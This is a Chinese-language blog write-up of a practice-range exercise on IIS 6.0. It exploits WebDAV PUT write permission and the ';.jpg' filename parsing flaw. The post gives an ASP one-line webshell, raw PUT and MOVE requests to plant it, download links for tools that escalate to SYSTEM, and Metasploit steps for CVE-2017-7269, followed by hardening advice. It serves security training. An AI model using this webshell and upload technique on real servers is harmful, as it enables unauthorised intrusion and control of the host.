---
title: "IIS 6.0漏洞复现"
categories: [ "安全技术","工具分享" ]
tags: [ "漏洞利用","靶机" ]
draft: false
slug: "552"
date: "2020-04-01 14:34:00"
---

是的炒冷饭

## 0x01 事情起因

整理遗漏靶场，靶场本身很简单，抛砖引玉，主要是想分享几篇好文章

## 0x02 漏洞介绍

### IIS 6.0 解析漏洞介绍

> IIS 是 Internet Information Services 的缩写，意为互联网信息服务，是由微软公司提供的基于运行 Microsoft Windows 的互联网基本服务。IIS 目前只适用于 Windows 系统，不适用于其他操作系统

`IIS6`解析漏洞基于文件名，该版本 默认会将`*.asp;.jpg`此种格式的文件名，当成`Asp`解析，原理是服务器默认不解析; 号及其后面的内容，相当于截断

另外，IIS6.x 除了会将扩展名为.asp 的文件解析为 asp 之外，还默认会将扩展名为.asa，.cdx，.cer 解析为 asp，
从网站属性->主目录->配置 可以看出，他们都是调用了 asp.dll 进行的解析。

### IIS PUT 漏洞介绍

> IIS 6.0 PUT 上传漏洞。产生原因是 IIS Server 在 Web 服务扩展中开启了 WebDAV。并且管理员在配置权限时，没有遵循最小原则。给 IIS 配置了可以写入的权限，包括网站根目录。

**也叫做 IIS 写权限漏洞**

## 0x03 靶场复现

### 题目描述

[靶场地址][1]

背景介绍：

> 某日，安全工程师"墨者"对一内网进行授权扫描，在扫描过程中，发现了一台 Windows2003 的服务器，开启了 web 服务，业主单位员工坚称是一个调试服务器，只安装了 IIS6.0，无任何代码程序，不可能会有安全问题。"墨者"一听就来劲了，拿起工具，手起刀落～～～～～～

实训目标

- 了解 IIS WebDAV 安全配置
- 了解 HTTP 标准方法外的其他一些方法
- 掌握 HTTP PUT 的方法测试利用
- 了解 IIS6 的畸形解析漏洞及利用测试方法

解题方向

通过上传程序脚本，获取 WEB 的权限；
PS：不要过于依赖现成工具！

题目打开长这样：

![][2]

### 思路探寻

先看下`iis`版本，可以用浏览器插件`Wappalyzer`，也可以使用`OPTIONS`请求方法查看：

> HTTP1.0 定义了三种请求方法： GET、POST、HEAD
> HTTP1.1 新增了五种请求方法：OPTIONS、PUT、DELETE、TRACE 、CONNECT

```
curl -X OPTIONS http://xxx.xxx.xxx.xxx:yyy/ -I
```

![][3]

可以看到版本是`6.0`

### burp 手操

我们先来使用手动操作一遍，不建议成为工具党

将`GET`修改为`OPTIONS`查看可执行命令：

![][4]

然后我们`PUT`一个`ASP`一句话上去，文件名随便写比如`2.txt`：

```
<%eval request("soapffz")%>
```

![][5]

返回`201 Created`，创建成功

PS:

这里注意一个问题，不要只把`GET`改为`PUT 2.txt`，后面还有一个斜杠`/`记得删掉

我开始也搞了半天，看解析思路评论区很多老哥说怎么试都不行最后精简为自己手写请求语句和`HOST`才成功

我看了下都是没有删除这个斜杠，所以做题一定要细心啊

然后就可以使用`MOVE`命令把`2.txt`改为`2.asp;.jpg`让解析漏洞解析`asp`

核心语句如下；

```
MOVE /2.txt HTTP/1.1
Host: ip:端口
Destination: /2.asp;.jpg
<%eval request("soapffz")%>
```

![][6]

会返回`401 Unauthorized`，这个不影响，直接上蚁剑连接：

![][7]

成功拿到`flag`

### 工具操作

`IIS Put Scaner v1.3`，来自[`nosec`][8]，源网页已经找不到了，可以简单探测：

![][9]

可以看到`PUT`为`YES`，所以具有写权限，还有一款扫描工具`DotNetScan`:

![][10]

上传`asp`木马的话使用著名工具桂林老兵的`iiswrite`

软件的标题为：`对IIS写权限的利用 / 自定义数据包提交 - 桂林老兵作品`(目前下载默认被火绒查杀)

知道了有写权限后，我们来上传把`asp`后缀改为`txt`的木马(只能上传`txt`文件)

```
<%eval request("soapffz")%>
```

返回`201`说明上传成功，但是此时木马不能被解析，再用工具的`MOVE`或者`COPY`方法把后缀改为`asp`

但是这个工具有一个缺陷，就是默认只能测试`80`端口的站点，如果站点不在`80`端口无法使用：

![][11]

## 0x04 尝试拿下服务器

### 看看我是啥权限

靶场做完了，不继续搞一下不就浪费了我 4 个靶场币吗？

看下权限：

![][12]

连`whoami`都不能执行，权限很低啊，根据参考文章：[拿到 webshell 后虚拟终端拒绝访问][13]

操作如下；

下载 cmd.exe 和 iis6.0.exe

```
https://sudo0m.coding.me/update/webshell/cmd.exe
https://sudo0m.coding.me/update/webshell/iis6.exe
```

然后上传到网站根目录，这里上传的时候蚁剑还报了`500 Internal Server`错误

![][14]

用菜刀上传成功：

![][15]

设置终端为`cmd.exe`：`setp c:\inetpub\wwwroot\test.exe`

然后就可以用`iis6.exe`加上命令执行命令了：

![][16]

执行了下`whoami`已经是`system`权限了，那也就没机会练习提权了

附上`secwiki`的`Windows`提权[GitHub 项目][17]

### CVE-2017-7269

这个`exp`的利用不是那么一帆风顺的，参考文章：[IIS6_WebDAV 远程代码执行漏洞(CVE-2017-7269)的正确打开方式][18]

`msf`自带一个利用模块`exploit/windows/iis/iis_webdav_scstoragepathfromurl`

但是实测失败：

![][19]

### 利用失败的原因

失败的原因有以下几种：

#### 端口和域名绑定问题

实际环境中，iis 绑定的域名和端口可能不是默认的，比如：

默认绑定：

![][20]

非默认绑定：

![][21]

> If 头信息中的两个 url 是要求和站点绑定相匹配的，否则只能收到一个 502。这里所说的相匹配指的是 if 头中 url 的 port 必须与站点绑定的端口相匹配，而 if 头中的域名只需要和 host 头保持一致就好

在我这种实战场景中如果遇到这种情况一般就没办法了，因为服务器不是自己的进不去设置

#### 物理路径

> POC 中 If 头中的第一个 URL 会被解析成物理路径，默认情况下是 C:\Inetpub\wwwroot\，也就是 19,在覆盖缓冲区的时候填充的字符长度要根据物理路径的长度来决定，且物理路径长度 + 填充字符的个数 = 114。POC 中的是按照默认的物理路径（19 位）来计算填充字符的长度的，当物理路径的长度不为 19 位的时候就会收到一个 500。（这里物理路径长度计算方法要加上最后的\）

爆破物理路径长度并检测漏洞工具[`IIS6_WebDAV_Scanner`][22]，但是这个靶场检测不出来：

![][23]

**我这个靶场就是默认的物理路径，也就是长度 19，所以不是物理路径的问题**

试下网上的`exp`，下载[`exp`][24]并放入`msf`的`exploit`目录：

```
mv cve-2017-7269.rb cve_2017_7269.rb
(-改为_否则无法识别)
mv cve_2017_7269.rb /usr/share/metasploit-framework/modules/exploits/windows/iis/
use exploit/windows/iis/cve_2017_7269
(如果找不到脚本，可尝试执行reload_all，并再次重启msf)
```

## 0x05 漏洞修复建议

> IIS 远程漏洞主要包括缓冲区溢出、认证绕过、拒绝服务、代码执行和信息泄露漏洞，本地漏洞主要分布在信息泄露和权限提升漏洞分类，大部分漏洞利用难度较大，但是一旦成功被攻击者利用，影响的不仅仅只是 IIS 服务器，甚至可能是运行 IIS 的 Windows 主机。如果用户主机被利用，那么攻击者可以将此台主机当作肉鸡攻击内网中的其他主机、服务器或者网络设备等，后果不堪设想

由于微软并不认为 IIS6.0 这是一个漏洞，也没有推出 IIS 6.0 的补丁，因此漏洞需要自己修复。

- 限制上传目录执行权限，不允许执行脚本(图片来自参考文章 1)

![][25]

- 不允许新建目录

- 上传的文件需经过重命名(时间戳+随机数+.jpg 等)

参考文章：

- [Web 中间件常见安全漏洞总结][26]
- [那些年让我们心惊胆战的 IIS 漏洞][27]
- [Web 中间件漏洞总结之 IIS 漏洞][28]

本文完。

[1]: https://www.mozhe.cn/bug/detail/VnRjUTVETHFXWk5URWNjV2VpVWhRQT09bW96aGUmozhe
[2]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200401_143652.png
[3]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200401_150455.png
[4]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200402_191217.png
[5]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200402_193839.png
[6]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200402_194516.png
[7]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200402_194704.png
[8]: https://nosec.org/home/index
[9]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200401_151949.png
[10]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200401_221600.png
[11]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200401_215805.png
[12]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200402_210815.png
[13]: https://blog.csdn.net/sudo0m/article/details/85549259
[14]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200402_212406.png
[15]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200402_212524.png
[16]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200402_212621.png
[17]: https://github.com/SecWiki/windows-kernel-exploits
[18]: http://www.admintony.com/CVE-2017-7269.html
[19]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200401_224022.png
[20]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200402_203113.png
[21]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200402_203140.png
[22]: https://github.com/admintony/Windows-Exploit/tree/master/IIS6_WebDAV_Scanner
[23]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200402_210354.png
[24]: https://github.com/zcgonvh/cve-2017-7269
[25]: https://img.soapffz.com/archives_img/2020/04/01/archives_20200401_150621.png
[26]: https://www.lxhsec.com/2019/03/04/middleware/
[27]: https://mp.weixin.qq.com/s/FHb82rhk-63HSU7R_g1Atw
[28]: https://xz.aliyun.com/t/6783